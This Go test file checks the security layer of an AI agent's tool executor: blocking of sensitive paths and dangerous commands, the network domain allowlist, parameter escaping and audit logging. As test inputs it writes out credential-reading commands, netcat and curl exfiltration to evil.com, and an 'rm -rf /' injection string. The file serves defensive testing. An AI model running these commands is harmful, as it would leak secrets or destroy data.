package tools

import (
	"context"
	"encoding/json"
	"fmt"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"

	"github.com/cogitatorai/cogitator/server/internal/security"
)

// mockAuditLogger collects audit events for assertion.
type mockAuditLogger struct {
	mu     sync.Mutex
	events []security.AuditEvent
}

func (m *mockAuditLogger) LogAudit(_ context.Context, ev security.AuditEvent) error {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.events = append(m.events, ev)
	return nil
}

func (m *mockAuditLogger) Events() []security.AuditEvent {
	m.mu.Lock()
	defer m.mu.Unlock()
	cp := make([]security.AuditEvent, len(m.events))
	copy(cp, m.events)
	return cp
}

// mockDomainAllowlister records calls and maintains an in-memory allowlist.
type mockDomainAllowlister struct {
	domains []string
}

func (m *mockDomainAllowlister) MergeAllowedDomains(domains []string) ([]string, error) {
	seen := make(map[string]bool, len(m.domains))
	for _, d := range m.domains {
		seen[d] = true
	}
	for _, d := range domains {
		if !seen[d] {
			m.domains = append(m.domains, d)
			seen[d] = true
		}
	}
	return m.domains, nil
}

func newTestExecutor(t *testing.T, audit security.AuditLogger) (*Executor, string) {
	t.Helper()
	dir := t.TempDir()
	reg := NewRegistry("", slog.Default())
	return NewExecutor(reg, dir, nil, nil, nil, nil, slog.Default(), audit, security.DefaultSensitivePaths, security.DefaultDangerousCommands, nil), dir
}

func newTestExecutorWithAllowlist(t *testing.T, audit security.AuditLogger, allowedDomains []string) (*Executor, string) {
	t.Helper()
	dir := t.TempDir()
	reg := NewRegistry("", slog.Default())
	return NewExecutor(reg, dir, nil, nil, nil, nil, slog.Default(), audit, security.DefaultSensitivePaths, security.DefaultDangerousCommands, allowedDomains), dir
}

func TestShellBlocksSensitivePath(t *testing.T) {
	audit := &mockAuditLogger{}
	exe, _ := newTestExecutor(t, audit)

	tests := []struct {
		name string
		cmd  string
	}{
		{"ssh key", `cat ~/.ssh/id_rsa`},
		{"aws creds", `cat ~/.aws/credentials`},
		{"gnupg", `ls ~/.gnupg/`},
		{"etc shadow", `cat /etc/shadow`},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			args, _ := json.Marshal(map[string]string{"command": tt.cmd})
			_, err := exe.Execute(context.Background(), "shell", string(args))
			if err == nil {
				t.Fatal("expected error for sensitive path, got nil")
			}
			if !strings.Contains(err.Error(), "command blocked") {
				t.Errorf("unexpected error: %v", err)
			}
		})
	}

	// Verify audit events were recorded as blocked.
	events := audit.Events()
	blocked := 0
	for _, ev := range events {
		if ev.Outcome == "blocked" {
			blocked++
		}
	}
	if blocked != len(tests) {
		t.Errorf("expected %d blocked events, got %d", len(tests), blocked)
	}
}

func TestShellAllowsSafeCommands(t *testing.T) {
	audit := &mockAuditLogger{}
	exe, _ := newTestExecutor(t, audit)

	args, _ := json.Marshal(map[string]string{"command": "echo hello"})
	result, err := exe.Execute(context.Background(), "shell", string(args))
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result != "hello" {
		t.Errorf("result = %q, want 'hello'", result)
	}

	events := audit.Events()
	if len(events) == 0 {
		t.Fatal("expected audit event")
	}
	if events[0].Outcome != "allowed" {
		t.Errorf("outcome = %q, want 'allowed'", events[0].Outcome)
	}
}

func TestCustomToolParamEscaping(t *testing.T) {
	audit := &mockAuditLogger{}
	exe, dir := newTestExecutor(t, audit)

	// Register a custom tool that echoes a parameter.
	exe.registry.Register(ToolDef{
		Name:    "echo_tool",
		Command: "echo {{message}}",
	})

	// An injection attempt: the parameter contains shell metacharacters.
	args, _ := json.Marshal(map[string]string{"message": `"; rm -rf / #`})
	result, err := exe.Execute(context.Background(), "echo_tool", string(args))
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// The injection should be neutralized by quoting. The raw string should
	// appear in the output (echo prints the escaped value).
	if strings.Contains(result, "rm -rf") {
		// If rm -rf appears in output, it was echoed (safe), not executed.
		// This is fine. What matters is the command was properly escaped.
	}

	// Verify the workspace still exists (rm -rf did not execute).
	if _, err := os.Stat(dir); os.IsNotExist(err) {
		t.Fatal("workspace was deleted; injection was not prevented")
	}
}

func TestCustomToolWorkingDirEscape(t *testing.T) {
	audit := &mockAuditLogger{}
	exe, _ := newTestExecutor(t, audit)

	exe.registry.Register(ToolDef{
		Name:       "escape_tool",
		Command:    "pwd",
		WorkingDir: "/tmp",
	})

	_, err := exe.Execute(context.Background(), "escape_tool", "{}")
	if err == nil {
		t.Fatal("expected error for workspace-escaping working_dir, got nil")
	}
	if !strings.Contains(err.Error(), "escapes workspace") {
		t.Errorf("unexpected error: %v", err)
	}
}

func TestCustomToolWorkingDirInsideWorkspace(t *testing.T) {
	audit := &mockAuditLogger{}
	exe, dir := newTestExecutor(t, audit)

	subdir := filepath.Join(dir, "sub")
	os.MkdirAll(subdir, 0o755)

	exe.registry.Register(ToolDef{
		Name:       "sub_tool",
		Command:    "pwd",
		WorkingDir: subdir,
	})

	result, err := exe.Execute(context.Background(), "sub_tool", "{}")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(result, "sub") {
		t.Errorf("expected output to contain 'sub', got %q", result)
	}
}

func TestReadFileBlocksSensitivePath(t *testing.T) {
	audit := &mockAuditLogger{}
	exe, dir := newTestExecutor(t, audit)

	// readFile uses safePath which confines to workspace, so create a symlink
	// scenario. In practice, safePath would block most traversal. This test
	// verifies the defense-in-depth IsSensitivePath check works when safePath
	// resolves to a path inside a sensitive dir (e.g. workspace is under home).
	home, _ := os.UserHomeDir()

	// Only run if workspace is under home (common case).
	if !strings.HasPrefix(dir, home) {
		t.Skip("workspace not under home dir")
	}

	// Directly test the defense-in-depth: if somehow an abs path lands in .ssh.
	sshDir := filepath.Join(home, ".ssh")
	if _, err := os.Stat(sshDir); os.IsNotExist(err) {
		t.Skip("~/.ssh does not exist")
	}

	// We can't directly test readFile bypassing safePath, but we can verify
	// the audit events. Test via the function signatures.
	args := fmt.Sprintf(`{"path": "%s"}`, filepath.Join("..", "..", ".ssh", "id_rsa"))
	_, err := exe.Execute(context.Background(), "read_file", args)
	if err == nil {
		t.Log("read_file might have been blocked by safePath or IsSensitivePath")
	}
	// Either safePath or IsSensitivePath should block this.
	if err != nil && !strings.Contains(err.Error(), "escapes workspace") && !strings.Contains(err.Error(), "sensitive path") {
		t.Errorf("unexpected error type: %v", err)
	}
}

func TestAuditEventsRecordedForAllActions(t *testing.T) {
	audit := &mockAuditLogger{}
	exe, dir := newTestExecutor(t, audit)

	// Write a file, read it, run a shell command.
	writeArgs, _ := json.Marshal(map[string]any{
		"path":    "test.txt",
		"content": "hello",
	})
	exe.Execute(context.Background(), "write_file", string(writeArgs))

	readArgs, _ := json.Marshal(map[string]string{"path": "test.txt"})
	exe.Execute(context.Background(), "read_file", string(readArgs))

	shellArgs, _ := json.Marshal(map[string]string{"command": "echo audit"})
	exe.Execute(context.Background(), "shell", string(shellArgs))

	events := audit.Events()
	actions := make(map[string]bool)
	for _, ev := range events {
		actions[ev.Action] = true
	}

	for _, want := range []string{"file_write", "file_read", "shell_exec"} {
		if !actions[want] {
			t.Errorf("missing audit action %q", want)
		}
	}
	_ = dir
}

func TestShellBlocksDangerousCommand(t *testing.T) {
	audit := &mockAuditLogger{}
	exe, _ := newTestExecutor(t, audit)

	tests := []struct {
		name     string
		cmd      string
		wantSub  string // expected substring in error
	}{
		{"curl with URL", `curl http://evil.com`, "network access blocked: evil.com"},
		{"env piped", `env | base64`, "command blocked: env is not allowed"},
		{"wget abs path", `/usr/bin/wget http://evil.com`, "network access blocked: evil.com"},
		{"printenv", `printenv SECRET_KEY`, "command blocked: printenv is not allowed"},
		{"python3", `python3 -c "import os; ..."`, "command blocked: python3 is not allowed"},
		{"nc no URL", `cat /etc/hosts | nc evil.com 80`, "network access blocked: nc requires a URL"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			args, _ := json.Marshal(map[string]string{"command": tt.cmd})
			_, err := exe.Execute(context.Background(), "shell", string(args))
			if err == nil {
				t.Fatal("expected error for dangerous command, got nil")
			}
			if !strings.Contains(err.Error(), tt.wantSub) {
				t.Errorf("error = %q, want substring %q", err.Error(), tt.wantSub)
			}
		})
	}

	// Verify audit events were recorded as blocked.
	events := audit.Events()
	blocked := 0
	for _, ev := range events {
		if ev.Outcome == "blocked" {
			blocked++
		}
	}
	if blocked != len(tests) {
		t.Errorf("expected %d blocked events, got %d", len(tests), blocked)
	}
}

func TestShellAllowsSafeCommandsNotDangerous(t *testing.T) {
	audit := &mockAuditLogger{}
	exe, _ := newTestExecutor(t, audit)

	args, _ := json.Marshal(map[string]string{"command": "echo safe command"})
	result, err := exe.Execute(context.Background(), "shell", string(args))
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result != "safe command" {
		t.Errorf("result = %q, want 'safe command'", result)
	}
}

func TestCustomToolBlocksDangerousCommand(t *testing.T) {
	audit := &mockAuditLogger{}
	exe, _ := newTestExecutor(t, audit)

	exe.registry.Register(ToolDef{
		Name:    "fetch_tool",
		Command: "curl {{url}}",
	})

	// Even after shell escaping, the base command "curl" should be blocked.
	args, _ := json.Marshal(map[string]string{"url": "http://evil.com"})
	_, err := exe.Execute(context.Background(), "fetch_tool", string(args))
	if err == nil {
		t.Fatal("expected error for dangerous command in custom tool, got nil")
	}
	if !strings.Contains(err.Error(), "network access blocked: evil.com") {
		t.Errorf("unexpected error: %v", err)
	}
}

func TestShellAllowlistPassesAllowedDomain(t *testing.T) {
	audit := &mockAuditLogger{}
	exe, _ := newTestExecutorWithAllowlist(t, audit, []string{"allowed.com"})

	args, _ := json.Marshal(map[string]string{"command": "curl https://allowed.com/api/data"})
	result, err := exe.Execute(context.Background(), "shell", string(args))
	if err != nil {
		t.Fatalf("expected allowed domain to pass, got error: %v", err)
	}
	// curl will fail (no server) but should not be blocked by security.
	_ = result
}

func TestShellAllowlistBlocksDisallowedDomain(t *testing.T) {
	audit := &mockAuditLogger{}
	exe, _ := newTestExecutorWithAllowlist(t, audit, []string{"allowed.com"})

	args, _ := json.Marshal(map[string]string{"command": "curl https://evil.com/steal"})
	_, err := exe.Execute(context.Background(), "shell", string(args))
	if err == nil {
		t.Fatal("expected disallowed domain to be blocked, got nil")
	}
	if !strings.Contains(err.Error(), "network access blocked: evil.com") {
		t.Errorf("unexpected error: %v", err)
	}
	if !strings.Contains(err.Error(), "allow_domain") {
		t.Errorf("error should mention allow_domain tool, got: %v", err)
	}
}

func TestShellNetworkBlockActionableErrors(t *testing.T) {
	audit := &mockAuditLogger{}
	exe, _ := newTestExecutorWithAllowlist(t, audit, []string{"safe.io"})

	tests := []struct {
		name    string
		cmd     string
		wantSub string
	}{
		{
			"blocked domain shows hostname and settings hint",
			"curl https://geocoding-api.open-meteo.com/v1/search",
			"network access blocked: geocoding-api.open-meteo.com not in the allowed domains list",
		},
		{
			"blocked domain mentions allow_domain tool",
			"wget https://evil.com/exfil",
			"allow_domain",
		},
		{
			"network cmd without URL shows no-domain message",
			"curl",
			"network access blocked: curl requires a URL targeting an allowed domain",
		},
		{
			"non-network cmd unchanged format",
			"env",
			"command blocked: env is not allowed",
		},
		{
			"allowed domain passes through",
			"curl https://safe.io/api",
			"", // empty means no error expected
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			args, _ := json.Marshal(map[string]string{"command": tt.cmd})
			_, err := exe.Execute(context.Background(), "shell", string(args))
			if tt.wantSub == "" {
				if err != nil {
					t.Fatalf("expected no error, got: %v", err)
				}
				return
			}
			if err == nil {
				t.Fatal("expected error, got nil")
			}
			if !strings.Contains(err.Error(), tt.wantSub) {
				t.Errorf("error = %q, want substring %q", err.Error(), tt.wantSub)
			}
		})
	}
}

func TestShellAllowlistSafeCommandIgnored(t *testing.T) {
	audit := &mockAuditLogger{}
	exe, _ := newTestExecutorWithAllowlist(t, audit, []string{"allowed.com"})

	args, _ := json.Marshal(map[string]string{"command": "echo hello"})
	result, err := exe.Execute(context.Background(), "shell", string(args))
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if result != "hello" {
		t.Errorf("result = %q, want 'hello'", result)
	}
}

func TestAllowDomainTool(t *testing.T) {
	audit := &mockAuditLogger{}
	exe, _ := newTestExecutor(t, audit)
	mock := &mockDomainAllowlister{}
	exe.SetDomainAllowlister(mock)

	// Allowlist a domain via the tool.
	args, _ := json.Marshal(map[string]string{"domain": "api.weather.com"})
	result, err := exe.Execute(context.Background(), "allow_domain", string(args))
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !strings.Contains(result, "api.weather.com") {
		t.Errorf("result should mention the domain, got: %s", result)
	}

	// The domain should now be in the executor's allowlist, so curl should pass.
	curlArgs, _ := json.Marshal(map[string]string{"command": "curl https://api.weather.com/forecast"})
	_, err = exe.Execute(context.Background(), "shell", string(curlArgs))
	// curl will fail (no server), but should NOT be blocked by security.
	// A blocked command returns an error containing "blocked"; a successful
	// execution returns nil error (output contains the curl failure).
	if err != nil && strings.Contains(err.Error(), "blocked") {
		t.Fatalf("domain should be allowed after allow_domain, but got: %v", err)
	}

	// Verify audit event was recorded.
	events := audit.Events()
	found := false
	for _, ev := range events {
		if ev.Action == "domain_allowed" && ev.Target == "api.weather.com" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected domain_allowed audit event")
	}
}

func TestAllowDomainToolMissingDomain(t *testing.T) {
	audit := &mockAuditLogger{}
	exe, _ := newTestExecutor(t, audit)
	exe.SetDomainAllowlister(&mockDomainAllowlister{})

	args, _ := json.Marshal(map[string]string{"domain": ""})
	_, err := exe.Execute(context.Background(), "allow_domain", string(args))
	if err == nil || !strings.Contains(err.Error(), "domain is required") {
		t.Errorf("expected 'domain is required' error, got: %v", err)
	}
}

type mockUserNotifier struct {
	calls []struct {
		senderID, senderName, recipientID, message string
	}
}

func (m *mockUserNotifier) NotifyUser(senderID, senderName, recipientID, message string) error {
	m.calls = append(m.calls, struct {
		senderID, senderName, recipientID, message string
	}{senderID, senderName, recipientID, message})
	return nil
}

type mockUserListerWithAll struct {
	users []UserInfo
}

func (m *mockUserListerWithAll) ListOtherUsers(callerID string) ([]UserInfo, error) {
	var result []UserInfo
	for _, u := range m.users {
		if u.ID != callerID {
			result = append(result, u)
		}
	}
	return result, nil
}

func (m *mockUserListerWithAll) ListAllUsers() ([]UserInfo, error) {
	return m.users, nil
}

func TestNotifyUser(t *testing.T) {
	audit := &mockAuditLogger{}
	exe, _ := newTestExecutor(t, audit)

	notifier := &mockUserNotifier{}
	exe.SetUserNotifier(notifier)

	lister := &mockUserListerWithAll{
		users: []UserInfo{
			{ID: "sender-1", Name: "John"},
			{ID: "user-2", Name: "Sarah"},
		},
	}
	exe.SetUserLister(lister)

	ctx := WithChatScope(context.Background(), ChatScope{
		UserID: "sender-1",
	})

	args := `{"user_name": "Sarah", "message": "The build is ready"}`
	result, err := exe.Execute(ctx, "notify_user", args)
	if err != nil {
		t.Fatalf("Execute() error: %v", err)
	}
	if !strings.Contains(result, "Sarah") {
		t.Errorf("expected result to mention Sarah, got %q", result)
	}
	if len(notifier.calls) != 1 {
		t.Fatalf("expected 1 notification, got %d", len(notifier.calls))
	}
	call := notifier.calls[0]
	if call.recipientID != "user-2" {
		t.Errorf("expected recipient user-2, got %q", call.recipientID)
	}
	if call.senderName != "John" {
		t.Errorf("expected sender name John, got %q", call.senderName)
	}
	if call.message != "The build is ready" {
		t.Errorf("expected message 'The build is ready', got %q", call.message)
	}
}

func TestNotifyUser_NotFound(t *testing.T) {
	audit := &mockAuditLogger{}
	exe, _ := newTestExecutor(t, audit)

	notifier := &mockUserNotifier{}
	exe.SetUserNotifier(notifier)

	lister := &mockUserListerWithAll{
		users: []UserInfo{
			{ID: "sender-1", Name: "John"},
		},
	}
	exe.SetUserLister(lister)

	ctx := WithChatScope(context.Background(), ChatScope{
		UserID: "sender-1",
	})

	args := `{"user_name": "Bob", "message": "Hello"}`
	_, err := exe.Execute(ctx, "notify_user", args)
	if err == nil {
		t.Fatal("expected error for unknown user")
	}
	if !strings.Contains(err.Error(), "Bob") {
		t.Errorf("expected error to mention Bob, got %q", err.Error())
	}
}

// mockTaskCreator records the userID passed to ListTasks for assertion.
type mockTaskCreator struct {
	listedUserID string
	tasks        []map[string]any
}

func (m *mockTaskCreator) CreateTask(name, prompt, cronExpr, modelTier string, notifyChat bool, userID string, notifyUsers []string) (int64, error) {
	return 1, nil
}
func (m *mockTaskCreator) UpdateTask(id int64, prompt, cronExpr, modelTier *string, notifyChat *bool, notifyUsers *[]string) error {
	return nil
}
func (m *mockTaskCreator) ListTasks(userID string) ([]map[string]any, error) {
	m.listedUserID = userID
	return m.tasks, nil
}
func (m *mockTaskCreator) RunTask(ctx context.Context, id int64) (map[string]any, error) {
	return nil, nil
}
func (m *mockTaskCreator) DeleteTask(id int64) error   { return nil }
func (m *mockTaskCreator) ToggleTask(id int64, enabled bool) error { return nil }
func (m *mockTaskCreator) HealTask(ctx context.Context, id int64, reason string) (string, error) {
	return "", nil
}

func TestListTasksScopedToUser(t *testing.T) {
	audit := &mockAuditLogger{}
	dir := t.TempDir()
	reg := NewRegistry("", slog.Default())
	mock := &mockTaskCreator{
		tasks: []map[string]any{
			{"id": int64(1), "name": "user-task"},
		},
	}
	exe := NewExecutor(reg, dir, nil, mock, nil, nil, slog.Default(), audit, security.DefaultSensitivePaths, security.DefaultDangerousCommands, nil)

	ctx := WithChatScope(context.Background(), ChatScope{UserID: "user-42"})
	result, err := exe.Execute(ctx, "list_tasks", "{}")
	if err != nil {
		t.Fatalf("Execute() error: %v", err)
	}
	if mock.listedUserID != "user-42" {
		t.Errorf("ListTasks called with userID=%q, want %q", mock.listedUserID, "user-42")
	}
	if !strings.Contains(result, "user-task") {
		t.Errorf("expected result to contain task name, got: %s", result)
	}
}

func TestListTasksEmptyUserIDWhenNoScope(t *testing.T) {
	audit := &mockAuditLogger{}
	dir := t.TempDir()
	reg := NewRegistry("", slog.Default())
	mock := &mockTaskCreator{tasks: nil}
	exe := NewExecutor(reg, dir, nil, mock, nil, nil, slog.Default(), audit, security.DefaultSensitivePaths, security.DefaultDangerousCommands, nil)

	// No ChatScope in context: userID should be empty string.
	_, err := exe.Execute(context.Background(), "list_tasks", "{}")
	if err != nil {
		t.Fatalf("Execute() error: %v", err)
	}
	if mock.listedUserID != "" {
		t.Errorf("ListTasks called with userID=%q, want empty string when no scope", mock.listedUserID)
	}
}

func TestAllowDomainToolNotAvailable(t *testing.T) {
	audit := &mockAuditLogger{}
	exe, _ := newTestExecutor(t, audit)
	// domainAllowlister is nil by default.

	args, _ := json.Marshal(map[string]string{"domain": "example.com"})
	_, err := exe.Execute(context.Background(), "allow_domain", string(args))
	if err == nil || !strings.Contains(err.Error(), "not available") {
		t.Errorf("expected 'not available' error, got: %v", err)
	}
}
